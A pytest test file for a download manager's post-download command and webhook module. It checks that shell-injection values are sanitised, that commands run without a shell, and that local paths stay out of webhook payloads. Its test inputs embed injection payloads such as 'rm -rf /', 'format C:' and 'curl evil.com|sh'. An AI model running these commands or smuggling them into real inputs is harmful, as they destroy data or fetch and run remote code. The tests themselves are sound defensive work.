import os
import subprocess
import time
import json
from unittest.mock import patch, MagicMock

import pytest

from core.post_download import (
    sanitize_shell_variable,
    parse_command_template,
    build_command_args,
    run_post_download_command,
    send_webhook_notification,
    execute_post_download
)

def test_sanitize_shell_variable_removes_dangerous_chars():
    # Injection attempts with common shell metacharacters
    payload = 'file;rm -rf /;calc.exe&dir|whoami`id`$(uname)>out<in\n\r\x00^"test\''
    sanitized = sanitize_shell_variable(payload, allow_ampersand=False)

    for dangerous in [';', '&', '|', '`', '$', '(', ')', '<', '>', '\n', '\r', '\x00', '^', '"', "'"]:
        assert dangerous not in sanitized

    # Check normal text remains intact
    assert "file" in sanitized
    assert "rm -rf" in sanitized
    assert "calc.exe" in sanitized

def test_sanitize_shell_variable_url_allows_ampersand():
    # URLs typically have ampersand query parameters
    url = "https://example.com/watch?v=dQw4w9WgXcQ&t=42s;rm -rf /|calc.exe"
    sanitized = sanitize_shell_variable(url, allow_ampersand=True)

    # Ampersand is retained for query string
    assert "&t=42s" in sanitized
    # Metacharacters like semicolon and pipe are removed
    assert ";" not in sanitized
    assert "|" not in sanitized

def test_parse_command_template():
    # Empty or whitespace
    assert parse_command_template("") == []
    assert parse_command_template("   ") == []

    # Simple command
    assert parse_command_template("python notify.py") == ["python", "notify.py"]

    # Quoted path with spaces
    tokens = parse_command_template(r'"C:\Program Files\App\player.exe" --input "{filepath}"')
    assert len(tokens) == 3
    assert tokens[0] == r"C:\Program Files\App\player.exe"
    assert tokens[1] == "--input"
    assert tokens[2] == "{filepath}"

def test_build_command_args_prevents_injection():
    context = {
        "{filepath}": r"C:\Downloads\song; calc.exe",
        "{filename}": 'malicious&curl evil.com|sh',
        "{url}": "https://example.com/file?token=abc&id=123;reboot",
        "{category}": "Music;format C:",
        "{filesize}": "12.5 MB",
        "{bytes}": "13107200",
        "{status}": "Completed"
    }

    template = 'python notify.py "{filepath}" --name "{filename}" --url "{url}"'
    args = build_command_args(template, context)

    # Must be a list of distinct arguments
    assert isinstance(args, list)
    assert args[0] == "python"
    assert args[1] == "notify.py"

    # Shell operators must NOT appear as separate arguments or dangerous syntax
    assert ";" not in args[2]
    assert "calc.exe" in args[2]
    assert "&" not in args[4]
    assert "|" not in args[4]
    assert ";" not in args[6]
    assert "&id=123" in args[6]  # URL query parameter kept

@patch("subprocess.run")
def test_run_post_download_command_shell_false(mock_run):
    mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

    context = {
        "{filepath}": "C:\\safe\\path\\file.mp3",
        "{filename}": "file.mp3; calc.exe",
        "{url}": "https://example.com/test",
    }

    run_post_download_command('python notify.py "{filepath}" --name "{filename}"', context)

    time.sleep(0.15)
    mock_run.assert_called_once()
    called_args, called_kwargs = mock_run.call_args

    # MUST be shell=False
    assert called_kwargs.get("shell") is False
    # Command MUST be a list, not a raw string
    cmd_list = called_args[0]
    assert isinstance(cmd_list, list)
    assert cmd_list[0] == "python"
    assert cmd_list[1] == "notify.py"
    assert cmd_list[2] == "C:\\safe\\path\\file.mp3"
    assert cmd_list[3] == "--name"
    assert "calc.exe" in cmd_list[4]
    assert ";" not in cmd_list[4]

@patch("subprocess.run")
def test_execute_post_download_with_injection_payload(mock_run):
    mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

    rec = {
        "filename": "payload;calc.exe&reboot.mp3",
        "save_path": "C:\\Downloads\\payload;calc.exe&reboot.mp3",
        "url": "https://example.com/download.php?id=99;whoami",
        "category": "Audio",
        "total_size": 2048,
        "status": "Completed"
    }
    settings = {
        "command_enabled": True,
        "command": 'python process.py "{filepath}" --url "{url}"',
        "webhook_enabled": False
    }

    execute_post_download(rec, settings)
    time.sleep(0.15)

    mock_run.assert_called_once()
    called_args, called_kwargs = mock_run.call_args
    assert called_kwargs.get("shell") is False
    cmd_list = called_args[0]
    # Verify no semicolon or reboot command injection in filepath argument
    assert ";" not in cmd_list[2]
    assert "&" not in cmd_list[2]

@patch("httpx.Client")
def test_webhook_does_not_leak_filepath_by_default(mock_client_cls):
    """Ensure sensitive local file system paths are not leaked over webhook requests by default."""
    mock_client = MagicMock()
    mock_resp = MagicMock(status_code=204)
    mock_client.post.return_value = mock_resp
    mock_client_cls.return_value.__enter__.return_value = mock_client

    context = {
        "{filepath}": "C:\\Users\\JohnDoe\\Documents\\Confidential\\file.pdf",
        "{filename}": "file.pdf",
        "{url}": "https://company.internal/docs/file.pdf",
        "{filesize}": "1.2 MB",
        "{category}": "Belgeler"
    }

    send_webhook_notification("https://webhook.site/test", context, include_filepath=False)

    mock_client.post.assert_called_once()
    payload = mock_client.post.call_args[1]["json"]

    # Ensure filepath is NOT leaked in root payload or discord embed fields
    assert "filepath" not in payload
    assert "JohnDoe" not in json.dumps(payload)
    embed_fields = payload.get("embeds", [{}])[0].get("fields", [])
    assert not any(f.get("name") == "📍 Kayıt Konumu" for f in embed_fields)

@patch("httpx.Client")
def test_webhook_includes_filepath_when_permitted(mock_client_cls):
    """When user explicitly permits, filepath is included in the webhook payload."""
    mock_client = MagicMock()
    mock_resp = MagicMock(status_code=200)
    mock_client.post.return_value = mock_resp
    mock_client_cls.return_value.__enter__.return_value = mock_client

    context = {
        "{filepath}": "C:\\Users\\JohnDoe\\Documents\\Public\\file.zip",
        "{filename}": "file.zip",
        "{url}": "https://example.com/file.zip",
        "{filesize}": "15 MB",
        "{category}": "Sıkıştırılmış"
    }

    send_webhook_notification("https://webhook.site/test", context, include_filepath=True)

    mock_client.post.assert_called_once()
    payload = mock_client.post.call_args[1]["json"]

    assert payload.get("filepath") == "C:\\Users\\JohnDoe\\Documents\\Public\\file.zip"
    embed_fields = payload.get("embeds", [{}])[0].get("fields", [])
    assert any(f.get("name") == "📍 Kayıt Konumu" for f in embed_fields)

